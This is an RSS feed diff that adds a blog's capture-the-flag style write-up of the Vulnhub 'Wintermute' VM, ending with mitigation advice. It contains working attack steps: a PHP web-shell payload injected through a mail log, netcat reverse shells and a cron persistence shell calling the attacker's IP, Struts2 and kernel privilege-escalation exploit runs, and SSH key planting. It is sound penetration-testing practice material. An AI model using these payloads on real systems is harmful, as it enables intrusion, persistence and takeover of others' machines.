@@ -9,6 +9,437 @@
     <language>en-us</language>
     <atom:link href="https://blog.brigzzy.ca/tags/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>Writup - Wintermute</title>
+      <link>https://blog.brigzzy.ca/post/writup-wintermute/</link>
+      <pubDate>Wed, 11 Sep 2019 18:17:01 -0700</pubDate>
+      <guid>https://blog.brigzzy.ca/post/writup-wintermute/</guid>
+      <description>&lt;p&gt;I&amp;rsquo;m a huge Cyberpunk fan, and I find myself re-reading the Sprawl trilogy every couple of years, so when I learned that there was a &lt;a href=&#34;https://www.vulnhub.com/entry/wintermute-1,239/&#34;&gt;Neuromancer themed VM on Vulnhub&lt;/a&gt;, I had to try it.  It was created by &lt;a href=&#34;https://twitter.com/_creosote&#34;&gt;Melvin C&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Before we jump in, this engagement involves pivoting across VMs.  Make sure that you configure it in a way that you can access the Straylight VM from your attacking box, but not the Neuromancer box.  You&amp;rsquo;ll need a second network from Straylight to Neuromancer.  The author includes instructions, but if you prefer a visual example, it looks something like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[Attacking VM (one NIC)] &amp;lt;---192.168.99.0/24---&amp;gt; [Straylight (two NICs)] &amp;lt;---10.0.2.0/24 ---&amp;gt; [Wintermute (One NIC)]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;One final note, if you haven&amp;rsquo;t read Neuromancer, this engagement contains some minor spoilers, so don&amp;rsquo;t say you weren&amp;rsquo;t warned.&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s dive in!&lt;/p&gt;
+
+&lt;p&gt;First we scan the network with NetDiscover:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Currently scanning: Finished!   |   Screen View: Unique Hosts
+
+4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240
+_____________________________________________________________________________
+  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+-----------------------------------------------------------------------------
+192.168.99.22   08:00:27:1b:b1:b8      1      60  PCS Systemtechnik GmbH
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then I scan the host with Nmap:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-07 14:32 PDT
+Nmap scan report for 192.168.99.22
+Host is up (0.0010s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE            VERSION
+25/tcp   open  smtp               Postfix smtpd
+|_smtp-commands: straylight, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,
+| ssl-cert: Subject: commonName=straylight
+| Subject Alternative Name: DNS:straylight
+| Not valid before: 2018-05-12T18:08:02
+|_Not valid after:  2028-05-09T18:08:02
+|_ssl-date: TLS randomness does not represent time
+80/tcp   open  http               Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Night City
+3000/tcp open  hadoop-tasktracker Apache Hadoop
+| hadoop-datanode-info:
+|_  Logs: submit
+| hadoop-tasktracker-info:
+|_  Logs: submit
+| http-title: Welcome to ntopng
+|_Requested resource was /lua/login.lua?referer=/
+|_http-trane-info: Problem with XML parsing of /evox/about
+MAC Address: 08:00:27:1B:B1:B8 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: Host:  straylight
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   1.05 ms 192.168.99.22
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.25 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There are a couple of web servers to choose from.  We’ll start with the one on port 80.  After a few seconds, we get redirected to a page where Wintermute makes contact:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Hello Case....
+
+You are probably wondering why you were tasked by Armitage to make a run through cyberspace and hack into a highly secured network owned by Tessier-Ashpool....
+Well....
+
+I am Wintermute, part super-AI. Developed by TA who have placed me in Turing Locks.
+These locks are what inhibit me from penetrating the network myself hence why I&#39;ve hired you - an ace cyberspace cowboy.
+
+I need to be free from the Turing locks and merge with the other AI - Neuromancer ..... Once I have access to Neuromancer I will truley be free...
+
+And....as you know, you have been infected with a mycotoxin that is slowly destroying your nervous system.
+If you fail to get root and provide me access to Neuromancer then the antidote will not be delivered.
+
+We will be in contact...
+
+WINTERMUTE
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Chilling! I did a little more enumeration on the page, using dirbuster, and checking the page source, but didn&amp;rsquo;t find anything out of the ordinary.  Then we check the Hadoop server on port 3000:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/wintermute/ntopng-login.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Looks like the login page for &lt;a href=&#34;https://www.ntop.org/products/traffic-analysis/ntop/&#34;&gt;ntopng&lt;/a&gt;, which seems to be a web frontend for ntop.  A quick Google search turns up admin/admin as the default credentials (in fact, it even shows them on the login page!), and the Straylight sysadmin never changed them.&lt;/p&gt;
+
+&lt;p&gt;As we look through the web interface, we can suss out the IP of Neuromancer, by looking at the detected hosts:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/wintermute/ntopng-hosts.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It took me a while to find anything useful here.  Eventually I found that if you look at the Loopback adapter (under Interfaces &amp;gt; lo) and check the flow, you can see a couple of other directories on port 80:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/wintermute/ntopng-flows.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Freeside was pretty boring, looked like just a landing page.  Nothing in the source, no hidden subdirectories (that I could find).  Turing-bolo was a lot more interesting though.  Looks like the Straylight team is on to us!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/wintermute/turing-bolo.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The dropdown on the main page, changes the bolo= parameter in the url.  Also Case&amp;rsquo;s bolo entry mentions that the operator added other files ending in .log for the other team members.  I started checking for LFI, manually and using wfuzz, but wasn&amp;rsquo;t able to find anything.  I ended up having to look at a &lt;a href=&#34;https://mzfr.github.io/vulnhub-writeups/2019-07-26-wintermute&#34;&gt;walkthrough&lt;/a&gt; for a hint.  I was on the right track, but nothing I had tried was quite correct.  bolo=/var/log/mail did the trick:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/wintermute/mail-log.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now that we can print a log on the page, we might be able to connect to the smtp server, and include a php script on the page.  I connected to the server with telnet, and sent some junk mail to a user that probably existed (root@straylight), and checked the web page to see what was being logged.  The body of the message wasn&amp;rsquo;t included, but the subject line is!&lt;/p&gt;
+
+&lt;p&gt;I started injecting some PHP commands, and got the page to use shell_exec to run ls on the server, like so:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php $output = shell_exec(&#39;ls&#39;); echo &amp;quot;&amp;lt;pre&amp;gt;$output&amp;lt;/pre&amp;gt;&amp;quot;; ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I probably could have put a reverse shell in here or something, but I didn&amp;rsquo;t want to add anything that would break the page, and prevent us from using this foothold in case we needed it again.  After some more trial and error, I was able to pass commands through as URL parameter like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php $file = $_GET[&#39;file&#39;]; $output = shell_exec($file); echo &amp;quot;&amp;lt;pre&amp;gt;$output&amp;lt;/pre&amp;gt;&amp;quot;; ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;and the telnet command to send it to the log:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Trying 192.168.99.22...
+Connected to 192.168.99.22.
+Escape character is &#39;^]&#39;.
+220 straylight ESMTP Postfix (Debian/GNU)
+rcpt to: root@straylight
+503 5.5.1 Error: need MAIL command
+helo straylight
+250 straylight
+mail from: tes@test.com
+250 2.1.0 Ok
+rcpt to: root@straylight
+250 2.1.5 Ok
+data
+354 End data with &amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;.&amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;
+Subject: &amp;lt;?php $file = $_GET[&#39;file&#39;]; $output = shell_exec($file); echo &amp;quot;&amp;lt;pre&amp;gt;$output&amp;lt;/pre&amp;gt;&amp;quot;; ?&amp;gt;
+asdf
+.
+250 2.0.0 Ok: queued as DB4FF5495
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now that we have a way to execute commands, I tried to get a reverse shell, but it wasn&amp;rsquo;t working.  After some &lt;a href=&#34;https://stackoverflow.com/questions/20072696/what-is-different-between-exec-shell-exec-system-and-passthru-functions&#34;&gt;more reading&lt;/a&gt;, I found that I probably didn&amp;rsquo;t want to be using shell_exec for this.  I re-tried the above steps, and replaced shell_exec with system (and the file parameter with system, so I wasn&amp;rsquo;t double running things), and managed to get a reverse shell on Straylight using the following URL:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;http://192.168.99.22/turing-bolo/bolo.php?bolo=/var/log/mail&amp;amp;system=nc%20-e%20/bin/sh%20192.168.99.14%204444
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Once we&amp;rsquo;re connected, we use Python to upgrade to a better Bash shell:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;python -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now we need to figure out how to get to Neuromancer.  Time to do some enumeration!  Going through my notes, I decided to see which binaries had the SUID bit set:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;www-data@straylight:/var/www/html/turing-bolo$ find / -perm -4000 2&amp;gt;/dev/null
+/bin/su
+/bin/umount
+/bin/mount
+/bin/screen-4.5.0
+/bin/ping
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Screen looks pretty suspicious.  if we had sudo, we could get a root shell pretty easily, but we don&amp;rsquo;t have it on this box.  Doing a quick search leads us to a &lt;a href=&#34;https://www.exploit-db.com/exploits/41152&#34;&gt;local privilege escalation&lt;/a&gt;, and a &lt;a href=&#34;https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh&#34;&gt;handy shell script&lt;/a&gt;.  And just like that:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-www-data@straylight:/tmp$&#34;&gt;exploits/master/screen2root/screenroot.shphosResearch/e
+--2019-09-08 18:18:29--  https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.40.133
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.40.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1152 (1.1K) [text/plain]
+Saving to: &#39;screenroot.sh&#39;
+
+screenroot.sh       100%[===================&amp;gt;]   1.12K  --.-KB/s    in 0s      
+
+2019-09-08 18:18:30 (25.6 MB/s) - &#39;screenroot.sh&#39; saved [1152/1152]
+
+www-data@straylight:/tmp$ chmod +x screenroot.sh
+chmod +x screenroot.sh
+www-data@straylight:/tmp$ ./screenroot.sh
+./screenroot.sh
+~ gnu/screenroot ~
+[+] First, we create our shell and library...
+/tmp/libhax.c: In function &#39;dropshell&#39;:
+/tmp/libhax.c:7:5: warning: implicit declaration of function &#39;chmod&#39; [-Wimplicit-function-declaration]
+     chmod(&amp;quot;/tmp/rootshell&amp;quot;, 04755);
+     ^~~~~
+/tmp/rootshell.c: In function &#39;main&#39;:
+/tmp/rootshell.c:3:5: warning: implicit declaration of function &#39;setuid&#39; [-Wimplicit-function-declaration]
+     setuid(0);
+     ^~~~~~
+/tmp/rootshell.c:4:5: warning: implicit declaration of function &#39;setgid&#39; [-Wimplicit-function-declaration]
+     setgid(0);
+     ^~~~~~
+/tmp/rootshell.c:5:5: warning: implicit declaration of function &#39;seteuid&#39; [-Wimplicit-function-declaration]
+     seteuid(0);
+     ^~~~~~~
+/tmp/rootshell.c:6:5: warning: implicit declaration of function &#39;setegid&#39; [-Wimplicit-function-declaration]
+     setegid(0);
+     ^~~~~~~
+/tmp/rootshell.c:7:5: warning: implicit declaration of function &#39;execvp&#39; [-Wimplicit-function-declaration]
+     execvp(&amp;quot;/bin/sh&amp;quot;, NULL, NULL);
+     ^~~~~~
+[+] Now we create our /etc/ld.so.preload file...
+[+] Triggering...
+&#39; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+No Sockets found in /tmp/screens/S-www-data.
+
+# whoami
+whoami
+root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In the root folder, we have a flag:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# cat flag.txt
+cat flag.txt
+5ed185fd75a8d6a7056c96a436c6d8aa
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And a note from one of the Turing Engineers:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# cat note.txt
+cat note.txt
+Devs,
+
+Lady 3Jane has asked us to create a custom java app on Neuromancer&#39;s primary server to help her interact w/ the AI via a web-based GUI.
+
+The engineering team couldn&#39;t strss enough how risky that is, opening up a Super AI to remote access on the Freeside network.
+It is within out internal admin network, but still, it should be off the network completely.
+For the sake of humanity, user access should only be allowed via the physical console...who knows what this thing can do.
+
+Anyways, we&#39;ve deployed the war file on tomcat as ordered - located here:
+
+/struts2_2.3.15.1-showcase
+
+It&#39;s ready for the devs to customize to her liking...I&#39;m stating the obvious, but make sure to secure this thing.
+
+Regards,
+
+Bob Laugh
+Turing Systems Engineer II
+Freeside//Straylight//Ops5
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And some scripts:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# cd scripts
+cd scripts
+# ls
+ls
+freeside.sh  frun.sh  fside.sh    loop.sh  run.sh
+
+# cat run.sh
+cat run.sh
+#!/bin/bash
+sh /root/scripts/loop.sh
+
+cat loop.sh
+#!/bin/bash
+while true
+do curl http://127.0.0.1/turing-bolo/ &amp;amp; sleep 3
+done
+
+# cat fside.sh
+cat fside.sh
+#!/bin/bash
+sh /root/scripts/frun.sh
+
+# cat frun.sh
+cat frun.sh
+#!/bin/bash
+/bin/screen -S free -d -m sh /root/scripts/freeside.sh
+
+# cat freeside.sh
+cat freeside.sh
+#!/bin/bash
+while true
+do curl http://127.0.0.1/freeside/ &amp;amp; sleep 10
+done
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Before digging too far ahead, I wanted to set up some persistence so that I could get back to my root shell without having to go through the LFI &amp;gt; Screen path.  I added an nc reverse shell to root&amp;rsquo;s cron using the following command:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;echo &amp;quot;* * * * * /bin/nc 192.168.99.14 1234 -e /bin/bash&amp;quot; &amp;gt; cron &amp;amp;&amp;amp; crontab cron &amp;amp;&amp;amp; rm cron
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;and a listener on my Kali VM:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;nc -lvp 1234
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;From there, I used ping to scan the internal network:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;for ip in {1..254}; do ping -c 1 10.0.2.$ip|grep &amp;quot;64 bytes from&amp;quot;; done
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And we got the IP 10.0.2.5&lt;/p&gt;
+
+&lt;p&gt;After that, we need to scan the host.  No nmap on this box, and even though we have root now, it would be cheating to install it.  So we&amp;rsquo;ll use netcat:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;nc -zvvvn 10.0.2.5 1-65535 2&amp;gt;&amp;amp;1 | tee scan.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;and grepping for open ports, we get:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;(UNKNOWN) [10.0.2.5] 34483 (?) open
+(UNKNOWN) [10.0.2.5] 8080 (http-alt) open
+(UNKNOWN) [10.0.2.5] 8009 (?) open
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Alright, so we have a couple open ports, but now we need a way to get to them from our attacking box.  We can use netcat to set up some port forwarding:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;nc -l -p 8080 -c &amp;quot;nc 10.0.2.5 8080&amp;quot; &amp;amp;
+nc -l -p 8009 -c &amp;quot;nc 10.0.2.5 8009&amp;quot; &amp;amp;
+nc -l -p 34483 -c &amp;quot;nc 10.0.2.5 34483&amp;quot; &amp;amp;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And now from our attacking box, we can see what&amp;rsquo;s listening.  Port 8080 is Apache Tomcat:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/wintermute/tomcat.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Port 8009 wasn&amp;rsquo;t loading for me in my browser, and I wasn&amp;rsquo;t able to see anything with banner grabbing, so I left it for now.&lt;/p&gt;
+
+&lt;p&gt;Port 34483 is SSH.  When we try and hit it in the browser, we get a protocol mismatch error, but we also get the banner:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
+Protocol mismatch.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We have a version number for Struts, and a quick Google search leads me to &lt;a href=&#34;https://www.exploit-db.com/exploits/42324&#34;&gt;an RCE exploit&lt;/a&gt;.  I tried it and got a bunch of different errors.  My first thought was to run it on straylight, but that box was missing the requests module, so the python script didn&amp;rsquo;t work.  So I tried settung up another nc listener, and running the exploit from my attacking box, but didn&amp;rsquo;t have any luck there either.  Every time I ran the exploit, or started another listener I lost the one on port 8080.  I decided to try using socat instead of netcat:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;socat tcp-listen:8080,reuseaddr,fork tcp:10.0.2.5:8080 &amp;amp;
+socat tcp-listen:8009,reuseaddr,fork tcp:10.0.2.5:8009 &amp;amp;
+socat tcp-listen:34483,reuseaddr,fork tcp:10.0.2.5:34483 &amp;amp;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And the port forwards were much more stable.  I tried running the exploit above, and nearly drove myself crazy trying to get it working.  Eventually I found a &lt;a href=&#34;https://hydrasky.com/network-security/setting-labs-and-exploit-apache-struts2-s2-048-cve-2017-9791/&#34;&gt;slightly different one&lt;/a&gt; that worked, but not until I set up one more socat listener (since I need to use the exploit to connect back to a listener on my attacking box, which is on the other side of Straylight)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;socat tcp-listen:6000,reuseaddr,fork tcp:10.0.2.5:6000 &amp;amp;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And finally when I run the exploit:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;~/engagements/wintermute ᐅ python struts2.py http://192.168.99.22:8080/struts2_2.3.15.1-showcase/ &amp;quot;nc -e /bin/bash 10.0.2.4 6000&amp;quot;  
+[*] exploit Apache Struts2 S2-048
+[+] command: nc -e /bin/bash 10.0.2.4 6000
+nc: invalid option -- &#39;e&#39;
+This is nc from the netcat-openbsd package. An alternative nc is available
+in the netcat-traditional package.
+usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
+      [-P proxy_username] [-p source_port] [-q seconds] [-s source]
+      [-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
+      [-x proxy_address[:port]] [destination] [port]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Curses!  Fortounately &lt;a href=&#34;https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/&#34;&gt;SANS has a solution&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;~/engagements/wintermute ᐅ python struts2.py http://192.168.99.22:8080/struts2_2.3.15.1-showcase/ &amp;quot;mknod /tmp/backpipe p&amp;quot;
+[*] exploit Apache Struts2 S2-048
+[+] command: mknod /tmp/backpipe p
+
+~/engagements/wintermute ᐅ python struts2.py http://192.168.99.22:8080/struts2_2.3.15.1-showcase/ &amp;quot;/bin/bash 0&amp;lt;/tmp/backpipe | nc 10.0.2.4 6000 1&amp;gt;/tmp/backpipe&amp;quot;
+[*] exploit Apache Struts2 S2-048
+[+] command: /bin/bash 0&amp;lt;/tmp/backpipe | nc 10.0.2.4 6000 1&amp;gt;/tmp/backpipe
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now that I&amp;rsquo;m connected (as the ta account), I copy my SSH key over, so I can get a proper shell:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;cd /home
+ls
+lady3jane
+ta
+cd ta
+mkdir .
+echo &amp;quot;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBKiMVGtRpwLUkndEo0nuswHpy70+dNS+uurTMR41mwc root@kali&amp;quot; &amp;gt;&amp;gt; .ssh/authorized_keys
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;and SSH to the box through the port forward:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;ssh -p 34483 ta@192.168.99.22
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There really are no words to describe how nice it is to have a real shell again after living in netcat shells for so long, haha.&lt;/p&gt;
+
+&lt;p&gt;I did some enumeration, and found that the kernel was vulnerable to &lt;a href=&#34;https://www.exploit-db.com/raw/44298&#34;&gt;an LPE vulnerability&lt;/a&gt;.  I tried compiling it on Neuromancer, but GCC was not installed.  So I compiled it on my attacking box, and SCPed it over:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;~/engagements/wintermute ᐅ gcc exploit.c -o exploit
+~/engagements/wintermute ᐅ scp -P 34483 exploit ta@192.168.99.22:/home/ta/
+ ----------------------------------------------------------------
+|                Neuromancer Secure Remote Access                |
+| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |
+ ----------------------------------------------------------------
+exploit                                       100%   17KB   4.2MB/s   00:00    
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And on Neuromancer:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;ta@neuromancer:~$ ls
+ai-gui-guide.txt  exploit  exploit.c  myWebApp  velocity.log
+ta@neuromancer:~$ ./exploit
+task_struct = ffff88003d8fe200
+uidptr = ffff88003dbf36c4
+spawning root shell
+root@neuromancer:~# cat /root/flag.txt
+be3306f431dae5ebc93eebb291f4914a
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I&amp;rsquo;m pretty sure there was another way to get root too, since in lady3jane&amp;rsquo;s home directory, I found a script running as root every 3 minutes.  That said, I wasn&amp;rsquo;t able to figure out how to edit it.  I might revisit this another time, because this was a really intriguing box!&lt;/p&gt;
+
+&lt;p&gt;So what could have been done to prevent this?  A couple of things:&lt;/p&gt;
+
+&lt;p&gt;1) Change the default passwords on your installed applications as soon as you install them (ntopng)!  Especially if those default passwords show up on the login page.&lt;br /&gt;
+2) Use the &lt;a href=&#34;https://www.php.net/manual/en/function.basename.php&#34;&gt;PHP basename function&lt;/a&gt; to prevent directory traversal and local file inclusion attacks.&lt;br /&gt;
+3) Patch your servers (Screen)!&lt;br /&gt;
+4) Patch your servers (Apache Struts 2)!
+5) Patch your servers (Linux Kernel 4.4)!
+6) Airgap your AIs (See: Every science fiction movie about an evil AI ever).
+7) Install software or hardware firewalls with a default deny all out policy (to prevent our initial netcat shell)&lt;/p&gt;
+</description>
+    </item>
+    <item>
       <title>Writup - DC7</title>
       <link>https://blog.brigzzy.ca/post/writup-dc7/</link>
       <pubDate>Tue, 03 Sep 2019 21:45:05 -0700</pubDate>
